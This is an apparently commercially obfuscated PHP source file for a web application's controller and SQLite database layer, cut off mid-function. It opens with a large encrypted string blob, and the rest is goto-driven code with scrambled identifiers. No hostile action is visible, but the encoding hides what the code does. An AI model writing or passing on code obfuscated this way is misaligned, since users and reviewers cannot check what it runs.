ÙRtÚÒ')."\x3a\xcc\x22\x76\x2a\xc5\x78\x40\x92\x58\xaa\x7a\x2a\xfd\xe9\x87\x5f\x76\x9c\x79\x1b\x41\x11\x15\x54\x59\xcf\x17\x55\x6b\xce\xc8\x67\x2c\xae\x3f\x23\x0\x5d\xba\x60\xcc\x49\x2e\xac\x42\xa2\xb1\xc7"."\206\311\303\160\155\14\47\303\63\57\325\36\5\303\136\370\334\257\325\210\107\200\304\331\351\176\24\205\337\2\333\142\63\330\216\353\31\236\244\231\324\6\174\224\42\303\130\115\204"."\132\306\345\157\131\147\226\364\2\105\62\341\131\206\317\367\142\51\1\173\131\57\343\43\157\300\121\124\347\175\107\106\332\151\34\177\312\271\7\362\146\112\313\307\251\332\231\313\236"."\xc6\x42\xdc\x14\x57\x25\x75\x25\xa3\xa0\xa0\x56\x2a\x89\x3b\x2a\xf9\xc8\x44\x7f\x5d\x76\x8c\x10\xd7\x9b\xec\x54\x89\x35\xbe\x4a\xaf\xb2\x13\x62\xcd\x49\x57\x57\x14\x8\xd7\x58\xe5\x62\x84\x4a\xfd"."\135\120\113\342\363\144\175\147\172\41\46\54\347\40\71\152\147\17\275\304\203\1\223\213\144\27\253\134\4\335\56\75\112\37\254\274\210\305\12\165\200\121\144\175\123\270\11\17\310".base64_decode('jBgkUBYpYmm4NjJeSogapq/sEUwhE+5fAJXeOILX/Ko9WURXPvlp07OcqcFhcbjLHg==').base64_decode('RYRGhvehvcpHA9kDgWzrwOuAVZ78m/TFQJ8wkvyil5CEKZ/7DWvcD04acL6hgvXwcg==')."\35\174\130\75\31\342\336\101\116\232\225\362\130\161\125\355\172\317\120\352\65\240\266\312\67\21\245\141\220\372\135\266\362\76\162\153\357\143\36\371\252\76\253\350\172\227\311\73\241"."\125\36\146\374\322\2\101\333\227\60\135\31\67\326\153\132\224\262\330\35\247\67\231\341\132\273\252\245\13\23\40\352\300\264\342\200\130\135\310\314\234\65\147\201\54\334\20\123\50"."\56\4\301\217\1\134\140\2\265\42\26\205\342\136\206\12\363\232\52\357\176\22\351\126\304\256\174\266\323\163\2\374\317\66\214\340\36\150\122\111\55\272\362\371\343\212\21\40\353".strrev('ãVPÍÍ,w+,Øóf‹ËèY±=Îı*‡ÉE×tî^(èë±l6U‰ˆFD’RT')."\x9b\xc8\x48\x30\x26\xcd\x20\x6f\xae\xeb\xde\xb6\x93\x81\x1\x69\x8a\x88\x96\x18\x2b\xb9\x44\xc7\xf4\x8a\x82\x70\x76\x7c\x2e\x12\x49\x64\xac\x98\x87\x63\x1b\x9b\x85\x8b\xdd\x26\x61\xa2\xff\xc1\x4"."\x32\x1e\x89\xb2\x53\x42\x1f\xa8\x4a\xcf\x83\x4b\x19\x6a\xa9\xf2\xb2\xa6\xa4\x3b\xf1\x5\xed\xa6\xd4\x1d\xe7\x7\xfd\x9a\xe3\x97\x16\xa4\x24\x3e\xd4\x9d\x18\x99\x60\x40\x11\x82\x6d\x75\xf7\xd5\x53".base64_decode('PMomyljjUyZLVEniSQ9wCsdhEnGHczNb0Um4foap5KdFnZxgX+gOde1WyRexbEBHCg==').strrev('+ÃÌcéŒu·òšçoJèğ§KráÒMJÃpu¢1*ÄÃØ	ĞG$DBŠûÒÑeA·’').base64_decode('qt3FXaJwm+cpZYKVvO8rsyEiqEBgOck+18XK8BfnXKyN7X1mEhF4spdmFPQ+0wvokA==')."\50\316\323\332\244\3\125\234\235\342\253\273\134\20\1\111\244\113\270\50\36\351\62\143\306\16\260\74\73\237\31\107\333\236\347\147\251\377\134\372\315\210\375\377\353\27\26\377\137".base64_decode('Paw4p4EJ312vM3cAyc2ovAnJRzcV/Hr64T4094VVxN8el8JcO5g5QWO+0TR24aTl8w==')."\322\321\132\235\111\251\170\367\26\55\276\41\376\124\152\265\200\327\12\317\373\6\156\37\173\37\236\74\157\273\246\132\102\201\171\310\176\343\113\220\61\106\125\26\65\5\61\172\270".base64_decode('WHlZjCcv6nZ3LVEcFclEExBhwpzLBdlXGvOAxOMDDJ5suxsrMW6xHtD8mqUMNxFPAA==')."\200\242\144\264\344\2\125\40\263\244\153\112\134\100\171\264\141\12\261\351\63\233\115\127\216\56\317\203\236\64\221\55\217\246\113\136\137\251\73\120\231\233\243\1\71\13\326\311\166"."\213\260\370\263\354\15\336\167\332\33\375\225\225\121\223\10\54\105\211\143\271\5\223\104\221\53\35\162\227\132\45\17\135\266\11\221\146\222\215\123\175\373\362\207\124\205\130\16\177".strrev('ñ+İb:®ŞÖYï>$ÃC;‰¸ÄrçÔ0ØqP5>,½+¤Yr†çu	2Ç heıÉ')."\x12\xed\xa6\x98\x7b\xe9\xd\x6f\xbc\xc1\x84\x23\x4b\xec\x76\x8c\x88\xf\xe5\x23\x9c\x19\xdc\x49\xfa\xea\x0\x72\x9\xf9\x6c\xf9\x79\x11\x77\x4e\x6c\x81\xe0\xde\x4b\x8b\xab\x25\x4b\x9b\x96\x2d\x25"."\343\360\152\151\361\12\223\205\30\162\34\176\145\331\161\315\205\170\276\300\373\154\1\141\355\51\267\356\142\332\341\132\127\6\111\267\236\210\362\316\270\337\101\41\221\4\314\174\236".strrev('^VM5’éwÕû—7·”ô‰ÓDƒ)á‰FÅú•Ì\\“E*#e›@¯k;”Úû½Ò	B')."\270\362\36\115\134\357\111\104\7\313\206\331\42\161\36\170\340\325\36\61\317\152\43\202\142\22\204\171\46\323\256\215\124\111\232\141\254\11\207\42\10\117\112\50\56\311\316\131\250"."\xcc\xeb\xa3\xde\xb7\x9c\x3\xb2\x6d\xb4\x2b\x61\x25\x54\xd8\x41\x4b\xf9\xc5\x8d\x8a\xe8\x26\x86\x55\xeb\x3e\xd9\x68\xee\xec\xb2\x9d\x35\x5f\x54\x2\x44\x5f\xb2\xe0\x2a\x58\x12\x13\x84\xcd\x40\x84"."\x6e\x16\xed\xa\xe7\xf5\x45\x95\x6e\xab\x6e\x9e\x8c\xcf\x19\x4a\x43\x8c\x6e\xfc\x2e\xa8\x87\xad\xc3\x62\x15\x46\x3e\x78\xa2\x6c\xf9\x1d\x66\xf7\xdd\xa9\x2c\x7c\x90\x96\x80\x9e\x8f\x4a\xc5\xc9\xf7".base64_decode('qpNmSFSvRKxK9xBL5vAigh11pmvwJRTJOwYp43KkqzneqSUciVi+FFggMl0aF3JH0Q==').base64_decode('9Lqn9XIGb89oDnvUcNI5iU2qjKyEWxWDChVVb6+3VWxMvcyjKKSiPZJyRtKskoe2qA==')."\152\66\32\205\163\12\332\325\225\167\222\41\300\171\151\24\316\133\21\315\62\113\262\26\51\237\243\225\355\111\272\127\71\170\40\200\310\124\351\260\207\115\247\111\47\33\317\252\211"."\53\253\203\25\347\115\115\44\26\325\133\41\4\15\236\113\362\152\255\250\232\170\322\126\210\324\236\123\240\32\256\145\61\125\260\253\320\226\250\304\343\42\256\212\356\6\55\23\237"."\321\262\53\255\52\321\262\42\110\165\125\221\170\325\255\157\273\165\70\74\160\171\140\300\23\53\120\127\260\332\20\333\230\67\206\204\132\33\123\111\237\352\302\357\345\342\120\321\344"."\147\106\106\250\34\142\165\351\220\345\35\310\212\322\334\353\264\130\226\234\333\126\325\220\367\141\46\277\222\235\316\153\354\32\100\62\55\240\54\217\351\30\151\335\355\101\127\366\250"."\x45\xe3\x59\x25\x79\x49\x50\xe8\x91\xd1\x9\x91\x83\x4b\xc7\xa0\x8a\x14\x8b\x80\x80\xae\x13\xe2\x72\x5a\x9e\x44\xb1\x88\x35\xe1\x32\xe9\xa0\x74\x2\xdc\x32\xd0\xb\xca\x56\x7c\x11\xce\xaf\xa6\x88"."\367\127\172\256\322\350\204\151\71\76\34\227\64\113\344\267\305\164\34\161\141\117\171\174\102\14\342\303\321\47\351\243\240\57\161\17\205\33\105\56\70\310\262\45\350\205\174\302\125"."\x29\x66\x9e\x13\x3a\x8d\x25\x48\xc9\x15\xc0\x17\x27\x3c\x20\x9f\x7d\x70\x65\xda\x5e\xf6\x5c\xea\xa\x0\x62\x4e\x53\xe6\x18\xf3\xad\x89\xd\xc9\x45\x7b\xc4\xd5\xa\x19\x32\x41\x9f\xc0\xf2\x93\x35".base64_decode('aoiJvh2kMUF4k8GvYUIRXlcLDJYGXNnpG1Vc0/SLSgCRqiiCOmQnjDjY3iSSiYqong==').base64_decode('UCKxMhZvo/7bK6JJLklDqSKqpzPWPVlcuCsUiVbEYWWmblU4QaNRkR7SSnIjOFkrIg==')."\xad\xcb\x44\x4b\xc8\xdd\xb3\x90\xd4\x97\x72\x26\x13\xc0\xb3\x9b\x8c\x84\x96\x67\x5c\xba\x64\x6b\xaa\x17\x84\xf7\x3b\x91\xa7\x68\xa4\x87\x84\xa4\x4f\x93\x88\x77\x9b\xb9\xa9\xe4\x1f\xee\xc7\x90\x3c"."\72\203\154\221\102\101\130\21\251\33\312\216\227\0\212\375\331\363\275\316\11\151\161\231\36\160\135\272\113\160\262\37\10\202\221\326\234\174\320\22\300\364\252\3\44\113\171\53\157"."\x1d\x48\xac\x18\x0\xdc\xb0\xe3\x4d\xd0\x62\x1b\x34\x53\xd2\xad\x2\x65\x63\xc0\xf2\x13\x86\x54\x52\x36\xa3\xdf\xae\x68\x47\x1b\xa8\x7a\xf7\x4c\x45\x7b\x78\xc7\xb\xa1\xdb\xff\x6\x64\x21\x8e\x88"."\216\254\0\0".strrev('').base64_decode('').""."".strrev(''), 10, -8))); goto b«§†ë¿ÙÕ; F¬Èˆ”Õ”‡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $´‰²€îä =& $_SERVER[ï»»·÷á]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$´‰²€îä[6]] =& $config; $this->values[$´‰²€îä[7]] =& $in; $this->tpl = TEMPLATE . MOD . $´‰²€îä[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($“·Ò•Ç) { if (1 === func_num_args()) { $this->{$“·Ò•Ç} = new $“·Ò•Ç(); } else { $„Ê­‹Ù‰ = new ReflectionClass($“·Ò•Ç); $ìâÃ¨¡ = func_get_args(); array_shift($ìâÃ¨¡); $this->{$“·Ò•Ç} = $„Ê­‹Ù‰->newInstanceArgs($ìâÃ¨¡); } return $this->{$“·Ò•Ç}; } public function routeBind($¾´ËßÔÃ, $÷şş±ó¯, $îèëØÓÔ = 3) { $Î™¬ğŒ† =& $_SERVER[ï»»·÷á]; $É¯Şßı§ = $this->in[$Î™¬ğŒ†[9]]; $¾´ËßÔÃ = str_replace($Î™¬ğŒ†[10], $Î™¬ğŒ†[11], trim(trim($¾´ËßÔÃ, $Î™¬ğŒ†[8]), $Î™¬ğŒ†[12])); if (!$¾´ËßÔÃ || count($É¯Şßı§) <= $îèëØÓÔ) { return !1; } $Êøáíñø = !0; $ŞşîÂ¾™ = explode($Î™¬ğŒ†[8], $¾´ËßÔÃ); for ($ÍÎ“°ğÛ = 0; $ÍÎ“°ğÛ < count($ŞşîÂ¾™); $ÍÎ“°ğÛ++) { if ($ŞşîÂ¾™[$ÍÎ“°ğÛ] != $É¯Şßı§[$îèëØÓÔ + $ÍÎ“°ğÛ]) { $Êøáíñø = !1; break; } } if (!$Êøáíñø) { return; } call_user_func_array(array($this, $÷şş±ó¯), array()); } public function routeArgs($¤¼Íúüù = 3) { $®ˆ³õŸ = $this->in[$_SERVER[ï»»·÷á][9]]; if (count($®ˆ³õŸ) <= $¤¼Íúüù) { return array(); } $Ç¿ë¼¥¿ = array(); for ($ÉµàôÏø = $¤¼Íúüù; $ÉµàôÏø < count($®ˆ³õŸ); $ÉµàôÏø += 2) { $Ç¿ë¼¥¿[$®ˆ³õŸ[$ÉµàôÏø]] = $®ˆ³õŸ[$ÉµàôÏø + 1]; $this->in[$®ˆ³õŸ[$ÉµàôÏø]] = $®ˆ³õŸ[$ÉµàôÏø + 1]; } return $Ç¿ë¼¥¿; } protected function assign($êÒ£ÖŒ‰, $ß¡Ü­Â) { $this->values[$êÒ£ÖŒ‰] = $ß¡Ü­Â; } protected function display($æ×é³“ì) { ob_end_clean(); extract($this->values); require $this->tpl . $æ×é³“ì; } } class DbSqliteBase extends Db { public function __construct($Ûœ¹Èà° = '') { $ì“®İßÎ =& $_SERVER[ï»»·÷á]; if (!extension_loaded($ì“®İßÎ[13])) { think_exception(think_lang($ì“®İßÎ[14]) . $ì“®İßÎ[15]); } if (!empty($Ûœ¹Èà°)) { if (!isset($Ûœ¹Èà°[$ì“®İßÎ[16]])) { $Ûœ¹Èà°[$ì“®İßÎ[16]] = 438; } $this->config = $Ûœ¹Èà°; if (empty($this->config[$ì“®İßÎ[17]])) { $this->config[$ì“®İßÎ[17]] = array(); } } } public function connect($÷½¤„Ÿ = '', $šÇÜĞ¨¨ = 0) { $¬Ø±©Œ¨ =& $_SERVER[ï»»·÷á]; if (!isset($this->linkID[$šÇÜĞ¨¨])) { if (empty($÷½¤„Ÿ)) { $÷½¤„Ÿ = $this->config; } $‚šº¥ªÒ = !empty($÷½¤„Ÿ[$¬Ø±©Œ¨[17]][$¬Ø±©Œ¨[18]]) ? $÷½¤„Ÿ[$¬Ø±©Œ¨[17]][$¬Ø±©Œ¨[18]] : $this->pconnect; $‰ÙÏšÂ = $‚šº¥ªÒ ? $¬Ø±©Œ¨[19] : $¬Ø±©Œ¨[20]; $this->linkID[$šÇÜĞ¨¨] = $‰ÙÏšÂ($÷½¤„Ÿ[$¬Ø±©Œ¨[21]], $÷½¤„Ÿ[$¬Ø±©Œ¨[16]]); if (!$this->linkID[$šÇÜĞ¨¨]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$šÇÜĞ¨¨], 30000); if (1 != think_config($¬Ø±©Œ¨[22])) { unset($this->config); } } return $this->linkID[$šÇÜĞ¨¨]; } public function free() { $this->queryID = null; } public function query($…ÔËŸ£) { $±ƒ÷ØË =& $_SERVER[ï»»·÷á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…ÔËŸ£; if ($this->queryID) { $this->free(); } think_action_status($±ƒ÷ØË[23], 1); think_status($±ƒ÷ØË[24]); $this->queryID = sqlite_query($this->_linkID, $…ÔËŸ£); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $òÅ¾½³º = $this->getAll(); return $òÅ¾½³º; } } public function execute($»ßæ»Œˆ) { $å„˜íÆ =& $_SERVER[ï»»·÷á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»ßæ»Œˆ; if ($this->queryID) { $this->free(); } think_action_status($å„˜íÆ[25], 1); think_status($å„˜íÆ[24]); $ßóÆÀ¢Û = sqlite_exec($this->_linkID, $»ßæ»Œˆ); $this->debug(); if (!1 === $ßóÆÀ¢Û) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ï»»·÷á][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€˜ØŠŠ = sqlite_query($this->_linkID, $_SERVER[ï»»·÷á][27]); if (!$€˜ØŠŠ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ø‘âä¼ = sqlite_query($this->_linkID, $_SERVER[ï»»·÷á][28]); if (!$ø‘âä¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $£²¤œûÉ = array(); if ($this->numRows > 0) { for ($…§İ‘™½ = 0; $…§İ‘™½ < $this->numRows; $…§İ‘™½++) { $£²¤œûÉ[$…§İ‘™½] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $£²¤œûÉ; } public function getFields($»ŒÃõè‚) { $„’œ…àÜ =& $_SERVER[ï»»·÷á]; $ÑÍÜï© = $this->query($„’œ…àÜ[29] . $»ŒÃõè‚ . $„’œ…àÜ[30]); $Î’õ±¹ = array(); if ($ÑÍÜï©) { foreach ($ÑÍÜï© as $‚Ğ±‚»Ú => $•ó’×ïè) { $Î’õ±¹[$•ó’×ïè[$„’œ…àÜ[31]]] = array($„’œ…àÜ[32] => $•ó’×ïè[$„’œ…àÜ[31]], $„’œ…àÜ[33] => $•ó’×ïè[$„’œ…àÜ[34]], $„’œ…àÜ[35] => (bool) ($•ó’×ïè[$„’œ…àÜ[36]] === $„’œ…àÜ[12]), $„’œ…àÜ[37] => $•ó’×ïè[$„’œ…àÜ[38]], $„’œ…àÜ[39] => strtolower($•ó’×ïè[$„’œ…àÜ[40]]) == $„’œ…àÜ[41], $„’œ…àÜ[42] => strtolower($•ó’×ïè[$„’œ…àÜ[43]]) == $„’œ…àÜ[44]); } } return $Î’õ±¹; } public function getTables($¿§´‹æ‡ = '') { $ª©¹£Ÿâ =& $_SERVER[ï»»·÷á]; $´Ç–Üß = $this->query($ª©¹£Ÿâ[45] . $ª©¹£Ÿâ[46] . $ª©¹£Ÿâ[47]); $·÷½«ÊÃ = array(); foreach ($´Ç–Üß as $ºé¹´‚Â => $˜ —…À©) { $·÷½«ÊÃ[$ºé¹´‚Â] = current($˜ —…À©); } return $·÷½«ÊÃ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ûÊäöæœ =& $_SERVER[ï»»·÷á]; $´Ì‚¡…‚ = sqlite_last_error($this->_linkID); $this->error = $´Ì‚¡…‚ . $ûÊäöæœ[4] . sqlite_error_string($´Ì‚¡…‚); if ($ûÊäöæœ[12] != $this->queryStr) { $this->error .= LNG($ûÊäöæœ[48]) . $this->queryStr; } think_trace($this->error, $ûÊäöæœ[12], $ûÊäöæœ[49]); return $this->error; } public function escapeString($¬‘á¶³š) { return sqlite_escape_string($¬‘á¶³š); } public function parseLimit($Ì³‘–óŠ) { $ŸÇÇ†¦ =& $_SERVER[ï»»·÷á]; $ëµâ¯â§ = $ŸÇÇ†¦[12]; if (!empty($Ì³‘–óŠ)) { $Ì³‘–óŠ = explode($ŸÇÇ†¦[50], $Ì³‘–óŠ); if (count($Ì³‘–óŠ) > 1) { $ëµâ¯â§ .= $ŸÇÇ†¦[51] . $Ì³‘–óŠ[1] . $ŸÇÇ†¦[52] . $Ì³‘–óŠ[0] . $ŸÇÇ†¦[53]; } else { $ëµâ¯â§ .= $ŸÇÇ†¦[51] . $Ì³‘–óŠ[0] . $ŸÇÇ†¦[53]; } } return $ëµâ¯â§; } } class DbSqlite3Base extends Db { public function __construct($ˆæÃá¶à = '') { $ìŸôæ» =& $_SERVER[ï»»·÷á]; if (!class_exists($ìŸôæ»[54])) { think_exception(think_lang($ìŸôæ»[14]) . $ìŸôæ»[55]); } if (!empty($ˆæÃá¶à)) { if (!isset($ˆæÃá¶à[$ìŸôæ»[16]])) { $ˆæÃá¶à[$ìŸôæ»[16]] = 438; } $this->config = $ˆæÃá¶à; if (empty($this->config[$ìŸôæ»[17]])) { $this->config[$ìŸôæ»[17]] = array(); } } } public function connect($ˆê³Ê¶Æ = '', $“šŸÒÉÙ = 0) { $€¯‡“äĞ =& $_SERVER[ï»»·÷á]; if (!isset($this->linkID[$“šŸÒÉÙ])) { if (empty($ˆê³Ê¶Æ)) { $ˆê³Ê¶Æ = $this->config; } $this->linkID[$“šŸÒÉÙ] = new SQLite3($ˆê³Ê¶Æ[$€¯‡“äĞ[21]]); if (!$this->linkID[$“šŸÒÉÙ]) { think_exception($this->linkID[$“šŸÒÉÙ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$“šŸÒÉÙ]->busyTimeout(30000); if (1 != think_config($€¯‡“äĞ[22])) { unset($this->config); } } return $this->linkID[$“šŸÒÉÙ]; } public function free() { $this->queryID = null; } public function query($é© ˜Õ) { $·ó…İùÊ =& $_SERVER[ï»»·÷á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $é© ˜Õ; if ($this->queryID) { $this->free(); } think_action_status($·ó…İùÊ[23], 1); think_status($·ó…İùÊ[24]); $this->queryID = $this->_linkID->query($é© ˜Õ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ú¹‰‡›è = $this->getAll(); $this->numRows = count($Ú¹‰‡›è); return $Ú¹‰‡›è; } } public function execute($ÌÎÈı½×) { $­åÁ÷–º =& $_SERVER[ï»»·÷á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌÎÈı½×; if ($this->queryID) { $this->free(); } think_action_status($­åÁ÷–º[25], 1); think_status($­åÁ÷–º[24]); $›¥é‰§æ = $this->_linkID->exec($ÌÎÈı½×); $this->debug(); if (!1 === $›¥é‰§æ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ï»»·÷á][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Óƒêì™£ = $this->_linkID->query($_SERVER[ï»»·÷á][27]); if (!$Óƒêì™£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $…œÚÍÀß = $this->_linkID->query($_SERVER[ï»»·÷á][28]); if (!$…œÚÍÀß) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ãÂØä¯ı = array(); while ($×³Ç¤­× = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ãÂØä¯ı[] = $×³Ç¤­×; } $this->queryID->reset(); return $ãÂØä¯ı; } public function getFields($ôùãùêÌ) { $äØßºíï =& $_SERVER[ï»»·÷á]; $—ï²®×Ø = $this->query($äØßºíï[29] . $ôùãùêÌ . $äØßºíï[30]); $Î¢ª€™ = array(); if ($—ï²®×Ø) { foreach ($—ï²®×Ø as $Š—ëÙ³¹ => $Ğàá‡®â) { $Î¢ª€™[$Ğàá‡®â[$äØßºíï[32]]] = array($äØßºíï[32] => $Ğàá‡®â[$äØßºíï[32]], $äØßºíï[33] => $Ğàá‡®â[$äØßºíï[33]], $äØßºíï[35] => (bool) ($Ğàá‡®â[$äØßºíï[35]] === $äØßºíï[12]), $äØßºíï[37] => $Ğàá‡®â[$äØßºíï[56]], $äØßºíï[39] => (bool) $Ğàá‡®â[$äØßºíï[57]], $äØßºíï[42] => (bool) $Ğàá‡®â[$äØßºíï[57]]); } } return $Î¢ª€™; } public function getTables($è«¬ÙëÅ = '') { $©º¢şÎÅ =& $_SERVER[ï»»·÷á]; $æ‹¸÷  = $this->query($©º¢şÎÅ[45] . $©º¢şÎÅ[46] . $©º¢şÎÅ[47]); $÷ú•Ïèï = array(); foreach ($æ‹¸÷  as $ƒäñ´şÊ => $ËİíĞÑ¡) { $÷ú•Ïèï[$ƒäñ´şÊ] = current($ËİíĞÑ¡); } return $÷ú•Ïèï; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $…§„êÂ² =& $_SERVER[ï»»·÷á]; $this->error = $this->_linkID->lastErrorMsg(); if ($…§„êÂ²[12] != $this->queryStr) { $this->error .= LNG($…§„êÂ²[48]) . $this->queryStr; } think_trace($this->error, $…§„êÂ²[12], $…§„êÂ²[49]); return $this->error; } public function escapeString($‘ÂŞ’öà) { $ÀĞ¥èÅ£ =& $_SERVER[ï»»·÷á]; if ($this->_linkID) { return $this->_linkID->escapeString($‘ÂŞ’öà); } return str_ireplace($ÀĞ¥èÅ£[58], $ÀĞ¥èÅ£[59], $‘ÂŞ’öà); } public function parseLimit($İ³ãªê¢) { $õèºë„ =& $_SERVER[ï»»·÷á]; $”ùÉ÷¸ = $õèºë„[12]; if (!empty($İ³ãªê¢)) { $İ³ãªê¢ = explode($õèºë„[50], $İ³ãªê¢); if (count($İ³ãªê¢) > 1) { $”ùÉ÷¸ .= $õèºë„[51] . $İ³ãªê¢[1] . $õèºë„[52] . $İ³ãªê¢[0] . $õèºë„[53]; } else { $”ùÉ÷¸ .= $õèºë„[51] . $İ³ãªê¢[0] . $õèºë„[53]; } } return $”ùÉ÷¸; } } goto fáÂìÈŞ»‘; EÕ¿ÂŠØ¤: class DbSqlite3 extends DbSqlite3Base { public function query($Ç¯ŠßÒª) { $©üäæì‚ =& $_SERVER[ï»»·÷á]; if (!CacheLock::fileLock($©üäæì‚[13])) { return !1; } $Ô­Üî’” = parent::query($Ç¯ŠßÒª); CacheLock::fileUnLock($©üäæì‚[13]); return $Ô­Üî’”; } public function execute($€ùÑÃ›) { $Óâ¢¯ª =& $_SERVER[ï»»·÷á]; if (!CacheLock::fileLock($Óâ¢¯ª[13])) { return !1; } $ÂÓ‘Ë¼Ô = parent::execute($€ùÑÃ›); CacheLock::fileUnLock($Óâ¢¯ª[13]); return $ÂÓ‘Ë¼Ô; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\74\x3e", "\147\x74" => "\x3e", "\145\147\164" => "\x3e\75", "\x6c\x74" => "\x3c", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\x6f\x74\x6c\151\x6b\x65" => "\116\117\x54\x20\x4c\x49\x4b\x45", "\x6c\x69\153\x65" => "\114\x49\113\x45", "\151\x6e" => "\x49\116", "\x6e\x6f\x74\x69\x6e" => "\116\x4f\124\40\111\116", "\156\157\164\x20\x69\156" => "\116\x4f\x54\x20\111\116", "\x62\x65\x74\167\145\145\x6e" => "\x42\x45\124\127\105\x45\116", "\x6e\157\x74\x62\x65\164\167\x65\145\156" => "\116\117\x54\x20\x42\105\124\127\105\x45\x4e", "\x6e\157\x74\40\142\x65\164\167\x65\145\156" => "\x4e\117\124\40\102\x45\124\127\105\x45\x4e"); protected $selectSql = "\123\105\x4c\x45\103\124\x25\104\111\x53\x54\111\x4e\x43\x54\45\40\45\x46\111\x45\x4c\104\45\x20\106\x52\x4f\115\40\45\124\101\x42\114\105\45\45\112\117\111\x4e\x25\45\127\x48\x45\x52\105\x25\45\107\x52\117\x55\x50\45\45\x48\x41\x56\111\x4e\107\x25\x25\117\122\x44\x45\x52\45\x25\x4c\111\115\x49\124\x25\x20\45\x55\x4e\x49\x4f\x4e\x25\45\x43\117\x4d\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $‹Ëöê©™ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ï»»·÷á][970], $‹Ëöê©™); } public function factory($æŞ„Ùè = '') { $èá—­ğ =& $_SERVER[ï»»·÷á]; $æŞ„Ùè = $this->parseConfig($æŞ„Ùè); if (empty($æŞ„Ùè[$èá—­ğ[971]])) { think_exception(think_lang($èá—­ğ[972])); } $this->dbType = ucwords(strtolower($æŞ„Ùè[$èá—­ğ[971]])); $ôˆË©ş“ = $èá—­ğ[973] . $this->dbType; if (class_exists($ôˆË©ş“)) { $”Šœú€Ã = new $ôˆË©ş“($æŞ„Ùè); if ($èá—­ğ[974] != strtolower($æŞ„Ùè[$èá—­ğ[971]])) { $”Šœú€Ã->dbType = strtoupper($this->dbType); } else { $”Šœú€Ã->dbType = $this->_getDsnType($æŞ„Ùè[$èá—­ğ[926]]); } } else { think_exception(think_lang($èá—­ğ[975]) . $èá—­ğ[976] . $ôˆË©ş“); } return $”Šœú€Ã; } public function __call($ú¹Ä¤ïã, $êşØœ‰©) { if (method_exists($this, $ú¹Ä¤ïã)) { return call_user_func_array(array($this, $ú¹Ä¤ïã), $êşØœ‰©); } } protected function _getDsnType($˜×À÷•Ë) { $¢ó˜µßÍ = explode($_SERVER[ï»»·÷á][4], $˜×À÷•Ë); $·ŠõıÔ¢ = strtoupper(trim($¢ó˜µßÍ[0])); return $·ŠõıÔ¢; } private function parseConfig($ßòˆÙÁó = '') { $â…–‚Íó =& $_SERVER[ï»»·÷á]; if (!empty($ßòˆÙÁó) && is_string($ßòˆÙÁó)) { $ßòˆÙÁó = $this->parseDSN($ßòˆÙÁó); } elseif (is_array($ßòˆÙÁó)) { $ßòˆÙÁó = array_change_key_case($ßòˆÙÁó); $ßòˆÙÁó = array($â…–‚Íó[971] => $ßòˆÙÁó[$â…–‚Íó[977]], $â…–‚Íó[898] => $ßòˆÙÁó[$â…–‚Íó[978]], $â…–‚Íó[899] => $ßòˆÙÁó[$â…–‚Íó[979]], $â…–‚Íó[896] => $ßòˆÙÁó[$â…–‚Íó[980]], $â…–‚Íó[897] => $ßòˆÙÁó[$â…–‚Íó[981]], $â…–‚Íó[21] => $ßòˆÙÁó[$â…–‚Íó[982]], $â…–‚Íó[926] => $ßòˆÙÁó[$â…–‚Íó[983]], $â…–‚Íó[17] => isset($ßòˆÙÁó[$â…–‚Íó[984]]) ? $ßòˆÙÁó[$â…–‚Íó[984]] : array()); } elseif (empty($ßòˆÙÁó)) { if (think_config($â…–‚Íó[985]) && $â…–‚Íó[974] != strtolower(think_config($â…–‚Íó[986]))) { $ßòˆÙÁó = $this->parseDSN(think_config($â…–‚Íó[985])); } else { $ßòˆÙÁó = array($â…–‚Íó[971] => think_config($â…–‚Íó[986]), $â…–‚Íó[898] => think_config($â…–‚Íó[987]), $â…–‚Íó[899] => think_config($â…–‚Íó[988]), $â…–‚Íó[896] => think_config($â…–‚Íó[989]), $â…–‚Íó[897] => think_config($â…–‚Íó[990]), $â…–‚Íó[21] => 